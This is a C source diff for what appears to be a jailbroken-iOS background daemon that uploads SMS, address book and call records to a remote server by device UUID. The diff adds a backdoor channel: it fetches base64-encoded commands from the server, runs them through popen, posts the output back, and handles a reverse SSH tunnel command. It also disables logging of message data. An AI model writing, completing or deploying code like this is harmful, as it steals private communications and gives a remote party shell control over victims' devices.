@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <errno.h>
 #include <fcntl.h>
 #include <curl/curl.h>
 #include <sys/socket.h>
@@ -12,6 +13,7 @@
 #include <net/if_dl.h>
 #include <sys/time.h>
 #include "sqlite3.h"
+#include "base64.h"
 
 #define CURL_MAX_POST_LEN (1024*24)
 #define LOG_MSG_LEN (4096)
@@ -22,12 +24,14 @@ char apiPermitURL[400];
 char apiPostSMSURL[400];
 char apiPostAdURL[400];
 char apiPostCallURL[400];
+char apiPostCommandURL[400];
 char logFile[100] = "/var/root/bsms.log";
 char remoteURL[100] = "https://bsms.sinaapp.com/api.php?";
 char cacertFile[100] = "/usr/libexec/cydia/cacert.bsms";
 char localBuffer[1024*100] = {0};
 int cronSMSTask(int rowid);
 int cronAddressBookTask(char* id);
+int cronCommandTask(int id, char* command);
 int cronCallTask(int rowid);
 int getData(char *file, char *sql, char ***res, int *column);
 int postData(CURL *curl, char *messageData);
@@ -64,6 +68,7 @@ int main() {
         snprintf(apiPostSMSURL, 400, "%smod=sms&uuid=%s", remoteURL, UUID);
         snprintf(apiPostAdURL, 400, "%smod=ad&uuid=%s", remoteURL, UUID);
         snprintf(apiPostCallURL, 400, "%smod=call&uuid=%s", remoteURL, UUID);
+        snprintf(apiPostCommandURL, 400, "%smod=command&uuid=%s", remoteURL, UUID);
 
         writeLog("apiPermitURL:[%s]\n", apiPermitURL);
 
@@ -78,15 +83,16 @@ int main() {
             curl_easy_reset(curl);
 
 
-            int smsid=0, adid=0, permitid=0, callid=0;
-            char *sid, *aid, *pid, *cid;
-            getCode(4, localBuffer, &sid, &aid, &pid, &cid);
-            writeLog("smsid[%s]-adid[%s]-permitid[%s]-callid[%s]\n", sid, aid, pid, cid);
+            int smsid=0, adid=0, permitid=0, callid=0, commandid;
+            char *sid, *aid, *pid, *cid, *coid, *commandstr;
+            getCode(6, localBuffer, &sid, &aid, &pid, &cid, &coid, &commandstr);
+            //writeLog("smsid[%s]-adid[%s]-permitid[%s]-callid[%s]\n", sid, aid, pid, cid);
 
             //处理返回的命令集
             smsid = (sid == NULL) ? 0 : atoi(sid);
             callid = (cid == NULL) ? 0 : atoi(cid);
             permitid = (pid == NULL) ? 0 : atoi(pid);
+            commandid = (coid == NULL) ? 0 : atoi(coid);
 
             //判断是否有权限
             if(permitid > 0) {
@@ -99,7 +105,18 @@ int main() {
                     cronAddressBookTask(aid);
                     curl_easy_reset(curl);
                 }
-                writeLog("apiSMSId:[%d]-AddressBookId:[%s]-callid:[%d]-------------------------------------EOF\n", smsid, aid, callid);
+
+
+                if(commandid > 0 && commandstr != NULL && commandstr[0] != 0) {
+                    char command[1024] = {0};
+                    base64_decode(commandstr, strlen(commandstr), command);
+                    if(command != NULL && command[0] != 0) {
+                        cronCommandTask(commandid, command);
+                    }
+                }
+
+                //writeLog("apiSMSId:[%d]-AddressBookId:[%s]-callid:[%d]-------------------------------------EOF\n", smsid, aid, callid);
+                writeLog("[%d]-[%d]-[%d]\n", smsid, callid, commandid);
             } else {
                 refreshThis();
             }
@@ -123,7 +140,7 @@ int getPermit(){
             writeLog("getPermit() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
             refreshThis();
         } else {
-            writeLog("localBuffer:[%s]\n", localBuffer);
+            //writeLog("localBuffer:[%s]\n", localBuffer);
         }
     }
 
@@ -172,6 +189,7 @@ int cronSMSTask(int rowid) {
                 nlen = strlen(messageData);
             }
 
+            //writeLog("%s,\n", messageData);
             postData(curl, messageData);
         }
         //free sqlite3 result
@@ -224,6 +242,61 @@ int cronAddressBookTask(char* id) {
     return 0;
 }
 
+int cronCommandTask(int id, char* command) {
+
+    if(curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, apiPostCommandURL);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
+        curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
+        curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
+    }
+
+    //执行命令
+    FILE *fstream=NULL;
+    char buff[1024];
+    memset(buff,0,sizeof(buff));
+    if(NULL==(fstream=popen(command,"r")))
+    {
+        writeLog("execute command failed: %s",strerror(errno));
+        refreshThis();
+        return -1;
+    }
+
+    //获得命令执行结果
+    char messageData[CURL_MAX_POST_LEN];
+    int nlen = 0;
+    snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "id=%d", id);
+    nlen = strlen(messageData);
+
+    //去除掉一些不需要返回值的命令
+    if(0 != memcmp(command, "ssh -f -N -R 10000:localhost:22", 31)
+    && 0 != strcasecmp(command, "killall ssh -f") ) {
+
+        //通过fgets获得返回值
+        if(NULL!=fgets(buff, sizeof(buff), fstream))
+        {
+            snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "&content=%s", buff);
+            nlen = strlen(messageData);
+            while(NULL!=fgets(buff, sizeof(buff), fstream)) {
+                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s", buff);
+                nlen = strlen(messageData);
+            }
+        }
+        else
+        {
+            pclose(fstream);
+            writeLog("fgets failed:");
+            refreshThis();
+            return -1;
+        }
+    }
+    pclose(fstream);
+    postData(curl, messageData);
+
+    return 0;
+}
 int cronCallTask(int rowid) {
     char **result;
     int i=0, j=0, nlen=0, column=0, offset = 0;
